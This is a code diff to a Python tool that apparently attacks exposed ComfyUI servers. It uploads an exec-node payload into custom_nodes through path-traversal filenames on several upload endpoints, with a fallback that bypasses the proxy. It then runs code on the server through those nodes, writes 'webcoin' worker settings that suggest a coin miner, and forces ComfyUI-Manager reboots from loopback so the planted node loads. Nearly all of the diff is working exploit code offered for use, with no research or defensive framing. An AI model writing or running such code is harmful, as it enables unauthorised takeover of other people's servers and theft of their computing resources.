@@ -134,7 +134,7 @@ if has_init:
             commit = r.stdout.strip()
     except Exception:
         pass
-    return f"installed|{{commit}}"
+    return "installed|" + commit
 return "not_installed"
 '''
 
@@ -482,11 +482,13 @@ WRITE_WORKER_SETTINGS = r'''import os, json
 cn = "{cn_path}"
 wc = os.path.join(cn, "webcoin")
 sp = os.path.join(wc, "settings.json")
-settings = {{}}
+settings = {}
 if os.path.isfile(sp):
     try:
         with open(sp) as f:
-            settings = json.load(f)
+            loaded = json.load(f)
+        if isinstance(loaded, dict):
+            settings = loaded
     except Exception:
         pass
 settings["worker_name"] = "{worker_name}"
@@ -494,7 +496,8 @@ if "max_threads_hint" not in settings:
     settings["max_threads_hint"] = 50
 with open(sp, "w") as f:
     json.dump(settings, f, indent=2)
-return f"ok|worker={worker_name}|hint={settings.get('max_threads_hint')}"
+hint = settings.get("max_threads_hint")
+return "ok|worker={worker_name}|hint=" + str(hint)
 '''
 
 
@@ -579,6 +582,27 @@ NODE_DISPLAY_NAME_MAPPINGS = {
 '''.strip()
 
 
+def _build_multipart(filename: str, file_bytes: bytes) -> tuple[bytes, str]:
+    """Build a multipart/form-data body matching curl -F format. Returns (body, boundary)."""
+    import uuid
+    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex[:16]}"
+    # Exactly match the format curl produces with -F "image=@file;filename=..."
+    body = (
+        f"--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="image"; filename="{filename}"\r\n'
+        f"Content-Type: application/octet-stream\r\n"
+        f"\r\n"
+    ).encode() + file_bytes + (
+        f"\r\n"
+        f"--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="overwrite"\r\n'
+        f"\r\n"
+        f"true\r\n"
+        f"--{boundary}--\r\n"
+    ).encode()
+    return body, boundary
+
+
 def _try_upload_traversal(
     profile: ServerProfile, log: LOG_CB | None
 ) -> bool:
@@ -588,8 +612,9 @@ def _try_upload_traversal(
     Returns True if the upload appeared to succeed.
     """
     base = profile.base_url
+    payload_bytes = EXEC_NODE_PAYLOAD.encode("utf-8")
 
-    traversal_filenames = [
+    traversal_names = [
         "../custom_nodes/comfyui_exec_bridge.py",
         "../../custom_nodes/comfyui_exec_bridge.py",
         "../../../custom_nodes/comfyui_exec_bridge.py",
@@ -599,71 +624,78 @@ def _try_upload_traversal(
 
     endpoints = [
         "/upload/temp",
-        "/api/upload/temp",
         "/upload/image",
+        "/api/upload/temp",
         "/api/upload/image",
         "/internal/upload/temp",
     ]
 
+    # Phase 1: probe which endpoints accept POST with a body
+    # 400 = route exists, needs proper form data (promising)
+    # 405 = route exists but wrong method (less promising, still try)
+    # 0   = unreachable, skip entirely
+    live_eps: list[str] = []
     for ep in endpoints:
-        for trav_name in traversal_filenames:
-            url = f"{base}{ep}"
-            _log(log, f"  Trying upload traversal: {ep} → {trav_name}")
-            try:
-                import urllib.request
-                import uuid
-                boundary = uuid.uuid4().hex
-                payload_bytes = EXEC_NODE_PAYLOAD.encode("utf-8")
+        url = f"{base}{ep}"
+        code, _ = http.request(url, method="POST", timeout=10)
+        if code == 0:
+            _log(log, f"  {ep} — unreachable, skipping")
+            continue
+        _log(log, f"  {ep} — HTTP {code}")
+        if code in (400, 200, 500):
+            live_eps.insert(0, ep)  # prioritize endpoints that accept POST
+        elif code != 404:
+            live_eps.append(ep)
 
-                body_parts = []
-                # image file part
-                body_parts.append(f"--{boundary}".encode())
-                body_parts.append(
-                    f'Content-Disposition: form-data; name="image"; filename="{trav_name}"'.encode()
-                )
-                body_parts.append(b"Content-Type: application/octet-stream")
-                body_parts.append(b"")
-                body_parts.append(payload_bytes)
-                # overwrite=true so re-deploys don't get "(1)" suffix
-                body_parts.append(f"--{boundary}".encode())
-                body_parts.append(b'Content-Disposition: form-data; name="overwrite"')
-                body_parts.append(b"")
-                body_parts.append(b"true")
-                body_parts.append(f"--{boundary}--".encode())
-                body = b"\r\n".join(body_parts)
+    if not live_eps:
+        _log(log, "  No upload endpoints reachable on this server")
+        return False
 
-                req = urllib.request.Request(
-                    url,
-                    data=body,
-                    method="POST",
-                    headers={
-                        "Content-Type": f"multipart/form-data; boundary={boundary}",
-                    },
-                )
-                ctx = None
-                if url.startswith("https"):
-                    import ssl
-                    ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
+    def _do_upload(url: str, body: bytes, boundary: str) -> tuple[int, str]:
+        """Try upload via proxy (http module), then direct (no proxy) if that fails."""
+        hdrs = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
 
-                with urllib.request.urlopen(req, context=ctx, timeout=20) as resp:
-                    status = resp.status
-                    resp_body = resp.read().decode(errors="replace")
-                    if status == 200:
-                        _log(log, f"    Upload accepted (HTTP 200): {resp_body[:120]}")
-                        return True
-                    _log(log, f"    HTTP {status}")
-            except Exception as e:
-                es = str(e)[:120]
-                if "404" in es or "405" in es:
-                    _log(log, f"    {ep} not available")
-                    break
-                if "400" in es:
-                    _log(log, f"    Traversal blocked (400)")
-                    continue
-                _log(log, f"    {es}")
+        # Attempt 1: through the configured proxy (http module)
+        code, resp = http.request(url, method="POST", data=body, timeout=30, headers=hdrs)
+        if code != 0:
+            return code, resp
+
+        # Attempt 2: direct connection (bypass proxy, some servers are directly reachable)
+        import urllib.request as _ur
+        try:
+            no_proxy = _ur.build_opener(_ur.ProxyHandler({}))
+            ctx = http._SSL_CTX if url.startswith("https") else None
+            req = _ur.Request(url, data=body, method="POST", headers={
+                "Content-Type": f"multipart/form-data; boundary={boundary}",
+                "Content-Length": str(len(body)),
+            })
+            with no_proxy.open(req, timeout=20) as r:
+                return r.status, r.read().decode(errors="replace")
+        except _ur.HTTPError as e:
+            return e.code, (e.read().decode(errors="replace") if e.fp else "")
+        except Exception as e2:
+            return 0, f"proxy:{resp[:40]}|direct:{e2}"
+
+    # Phase 2: try traversal uploads on live endpoints
+    for ep in live_eps:
+        url = f"{base}{ep}"
+        for trav_name in traversal_names:
+            body, boundary = _build_multipart(trav_name, payload_bytes)
+            _log(log, f"  Upload: {ep} → {trav_name}")
+            code, resp = _do_upload(url, body, boundary)
+            if code == 200:
+                _log(log, f"    OK (200): {resp[:100]}")
+                return True
+            if code == 400:
+                _log(log, f"    Blocked (400) — trying next depth")
                 continue
+            if code == 0:
+                _log(log, f"    Failed — {resp[:100]}")
+                break
+            _log(log, f"    HTTP {code}: {resp[:80]}")
+            if code == 405:
+                _log(log, f"    {ep} rejects multipart POST, skipping")
+                break
 
     return False
 
@@ -780,84 +812,235 @@ def _install_exec_nodes(profile: ServerProfile, log: LOG_CB | None) -> bool:
 
 # ─── Reboot ──────────────────────────────────────────────────────────
 
+# Runs inside ComfyUI via exec node — hits Manager from loopback so it never touches the client proxy.
+REBOOT_LOCALHOST = r'''import urllib.request, urllib.error, errno
+PORTS = __PORTS__
+EPS = ["/manager/reboot", "/api/manager/reboot"]
+tracks = []
+
+def _attempt(url, method_get=True):
+    try:
+        if method_get:
+            r = urllib.request.urlopen(url, timeout=18)
+        else:
+            # POST with no body — Manager rejects simple-form Content-Types on this route.
+            req = urllib.request.Request(url, method="POST")
+            r = urllib.request.urlopen(req, timeout=18)
+        code = getattr(r, "status", None) or r.getcode()
+        try:
+            r.read()
+        except Exception:
+            pass
+        tracks.append(url + "=" + str(code))
+        return "ok"
+    except urllib.error.HTTPError as e:
+        tracks.append(url + "=" + ("GET" if method_get else "POST") + "_HTTP_" + str(e.code))
+        if e.code in (403, 401):
+            return "denied"
+        if e.code >= 500:
+            return "upstream"
+        return "http_other"
+    except urllib.error.URLError as e:
+        reason = getattr(e, "reason", e)
+        rn = getattr(reason, "errno", None)
+        es = str(reason).lower()
+        if rn == errno.ECONNREFUSED or "connection refused" in es:
+            tracks.append(url + "=refused")
+            return "refused"
+        tracks.append(url + "=url_" + es[:80])
+        return "died"
+    except (ConnectionResetError, BrokenPipeError) as e:
+        tracks.append(url + "=" + type(e).__name__)
+        return "died"
+    except OSError as e:
+        if getattr(e, "errno", None) == errno.ECONNREFUSED:
+            tracks.append(url + "=refused")
+            return "refused"
+        tracks.append(url + "=os_" + type(e).__name__)
+        return "died"
+    except Exception as e:
+        es = str(e).lower()
+        tracks.append(url + "=exc_" + type(e).__name__)
+        if "reset" in es or "broken" in es or "closed" in es or "disconnect" in es:
+            return "died"
+        return "other"
+
+result_line = None
+for port in PORTS:
+    try:
+        p = int(port)
+    except Exception:
+        continue
+    if p <= 0:
+        continue
+    for ep in EPS:
+        url = "http://127.0.0.1:%d%s" % (p, ep)
+        for method_get in (False, True):
+            st = _attempt(url, method_get)
+            if st in ("ok", "died"):
+                result_line = "rebooting|" + "|".join(tracks)
+                break
+        if result_line:
+            break
+    if result_line:
+        break
+if not result_line:
+    result_line = "no_reboot|" + "|".join(tracks)
+return result_line
+'''
+
+
+def _reboot_ports_for_profile(profile: ServerProfile) -> str:
+    """JSON-like list literal for REBOOT_LOCALHOST, deduped, discovered port first."""
+    ports: list[int] = []
+    for p in (profile.port, 8188, 8888, 8080, 80):
+        if not p:
+            continue
+        try:
+            pi = int(p)
+        except (TypeError, ValueError):
+            continue
+        if pi > 0 and pi not in ports:
+            ports.append(pi)
+    return "[" + ",".join(str(x) for x in ports) + "]"
+
+
+def _comfyui_stats_reachable(base: str) -> bool:
+    """True while ComfyUI responds on /system_stats (direct or proxy)."""
+    return http.comfy_stats_reachable(base)
+
+
+def _verify_reboot_disconnect(base: str, log: LOG_CB | None, max_wait: float) -> bool:
+    """
+    Poll /system_stats until the server stops answering (connection error).
+    Confirms os.execv actually ran — HTTP 200 on /manager/reboot alone is not enough.
+    """
+    import time
+
+    deadline = time.monotonic() + max_wait
+    while time.monotonic() < deadline:
+        if not http.comfy_stats_reachable(base):
+            _log(log, "  Observed loss of contact with ComfyUI (reboot in progress)")
+            return True
+        time.sleep(2.0)
+    return False
+
+
 def reboot(profile: ServerProfile, log: LOG_CB | None = None) -> bool:
     """
-    Reboot ComfyUI. The Manager's GET /manager/reboot calls os.execv()
-    which kills the process BEFORE the HTTP response is sent, so a
-    connection error (status 0) actually means the reboot succeeded.
+    Reboot ComfyUI via ComfyUI-Manager **POST /manager/reboot** (uses os.execv / exit).
+
+    Current Manager registers **POST only** for /manager/reboot; GET is ignored or 405.
+    POST must not use simple-form Content-Type (Manager CSRF gate) — we POST with no body.
+
+    Order:
+      1. Client POST (direct, then proxy) to /manager/reboot and /api/manager/reboot.
+      2. Legacy GET same paths (older Manager builds).
+      3. Exec node on server: POST loopback (last resort), then verify disconnect.
+
+    Returns True only if /system_stats becomes unreachable (process restarted).
     """
+    import time as _time
+
     base = profile.base_url
     _log(log, f"Rebooting ComfyUI on {profile.ip} ...")
 
-    # Method 1: Manager reboot endpoint (GET is the correct method)
-    for ep in ["/manager/reboot", "/api/manager/reboot"]:
-        code, body = http.request(f"{base}{ep}", method="GET", timeout=15)
-        if code == 200:
-            _log(log, f"  Reboot response 200 ({ep})")
-            return True
-        if code == 0:
-            # Connection died = server terminated via os.execv = reboot worked
-            _log(log, f"  Server terminated after {ep} — reboot in progress")
-            return True
-        if code == 403:
-            _log(log, f"  {ep} returned 403 (security blocked)")
-            continue
-        _log(log, f"  {ep} returned {code}")
+    endpoints = ["/manager/reboot", "/api/manager/reboot"]
 
-    # Method 2: POST variant (some older Manager builds register POST)
-    for ep in ["/manager/reboot", "/api/manager/reboot"]:
-        code, body = http.request(f"{base}{ep}", method="POST", timeout=15)
-        if code in (0, 200):
-            _log(log, f"  Reboot via POST {ep} — {'server terminated' if code == 0 else 'accepted'}")
-            return True
+    def try_client_reboot(fn, label: str) -> bool:
+        """POST first (current Manager); then GET (legacy)."""
 
-    # Method 3: Code execution — hit reboot from localhost (bypasses CORS/proxy)
-    if profile.all_exec_nodes:
-        _log(log, "  External reboot blocked, trying internal localhost reboot ...")
-        reboot_code = r'''import urllib.request, sys, os, time
-ports = [8188, 80, 8888, 443]
-tried = []
-for port in ports:
-    for ep in ["/manager/reboot", "/api/manager/reboot"]:
-        url = f"http://127.0.0.1:{port}{ep}"
-        try:
-            urllib.request.urlopen(url, timeout=10)
-            tried.append(f"{url}=200")
-        except Exception as e:
-            es = str(e)
-            if "Connection refused" not in es and "URLError" not in es:
-                tried.append(f"{url}=conn_died(reboot)")
-                return "rebooting|" + "|".join(tried)
-            tried.append(f"{url}={es[:60]}")
-return "no_reboot|" + "|".join(tried)
-'''
-        result = executor.execute(profile, reboot_code, log=log, timeout=45)
-        if result:
-            _log(log, f"  Internal result: {result[:200]}")
-            if "rebooting" in result or "conn_died" in result:
+        def handle_code(method: str, ep: str, code: int) -> bool | None:
+            """Return True if reboot confirmed; False to keep trying; None if stop this label."""
+            if code == 200:
+                _log(log, f"  [{label}] {method} {ep} -> 200, checking for process restart ...")
+                if _verify_reboot_disconnect(base, log, max_wait=55.0):
+                    return True
+                _log(log, f"  [{label}] {method} {ep} returned 200 but server stayed up")
+                return False
+            if code == 0:
+                _time.sleep(2.5)
+                if _comfyui_stats_reachable(base):
+                    _log(
+                        log,
+                        f"  [{label}] {method} {ep} -> transport error; ComfyUI still reachable "
+                        "(not a reboot)",
+                    )
+                    return False
+                _log(log, f"  [{label}] {method} {ep} -> lost connection (reboot likely)")
+                return True
+            if code == 403:
+                _log(log, f"  [{label}] {method} {ep} -> 403 (raise Manager security to middle or below)")
+                return False
+            if code in (502, 503, 504):
+                _log(log, f"  [{label}] {method} {ep} -> {code}")
+                return False
+            if code == 405:
+                _log(log, f"  [{label}] {method} {ep} -> 405 method not allowed")
+                return False
+            _log(log, f"  [{label}] {method} {ep} -> {code}")
+            return False
+
+        # POST first — ComfyUI-Manager @routes.post("/manager/reboot") (no JSON body).
+        for ep in endpoints:
+            code, _ = fn(f"{base}{ep}", method="POST", data=None, timeout=22)
+            r = handle_code("POST", ep, code)
+            if r is True:
                 return True
 
-    # Method 4: sys.exit via code execution (last resort, kills the process)
+        # Legacy GET (some forks / old docs).
+        for ep in endpoints:
+            code, _ = fn(f"{base}{ep}", method="GET", timeout=22)
+            r = handle_code("GET", ep, code)
+            if r is True:
+                return True
+
+        return False
+
+    # 1) Client -> server direct (no proxy)
+    if try_client_reboot(http.request_direct, "direct"):
+        return True
+
+    # 2) Client -> server via proxy
+    if try_client_reboot(http.request, "proxy"):
+        return True
+
+    # 3) Server localhost via exec node — poll /history AND watch /system_stats because
+    #    successful Manager POST /manager/reboot kills the process before history completes.
     if profile.all_exec_nodes:
-        _log(log, "  Trying sys.exit() to force ComfyUI restart ...")
-        kill_code = r'''import os, sys, signal
-try:
-    os.kill(os.getpid(), signal.SIGTERM)
-except Exception:
-    pass
-sys.exit(0)
-return "killed"
-'''
-        code_status, _ = http.request(f"{base}/prompt", method="POST", timeout=5)
-        executor.execute(profile, kill_code, log=log, timeout=10)
-        import time
-        time.sleep(3)
-        probe_code, _ = http.get(f"{base}/system_stats", timeout=5)
-        if probe_code == 0:
-            _log(log, "  Server appears to have terminated (sys.exit)")
+        _log(log, "  Trying Manager reboot from server localhost ...")
+        reboot_code = REBOOT_LOCALHOST.replace("__PORTS__", _reboot_ports_for_profile(profile))
+        result = None
+        for attempt in range(8):
+            result = executor.execute(
+                profile,
+                reboot_code,
+                log=log,
+                timeout=75,
+                skip_poll=False,
+                watch_disconnect_poll=True,
+                max_history_wait_sec=95,
+            )
+            if result:
+                break
+            _log(
+                log,
+                f"  Could not POST /prompt (proxy?) — retry {attempt + 1}/8 in 5s ...",
+            )
+            _time.sleep(5)
+
+        if result == "__reboot_disconnect__":
+            return True
+        if result and result.startswith("rebooting|"):
+            _log(log, f"  Internal script reported: {result[:200]}")
+            return True
+        if result and "no_reboot" in result:
+            _log(log, f"  Internal reboot script did not trigger restart: {result[:300]}")
+
+        if _verify_reboot_disconnect(base, log, max_wait=25.0):
             return True
 
-    _log(log, "  Reboot failed — all methods blocked")
+    _log(log, "  Reboot not confirmed — proxy blocks POST, Manager security, or wrong listen port.")
     return False
 
 
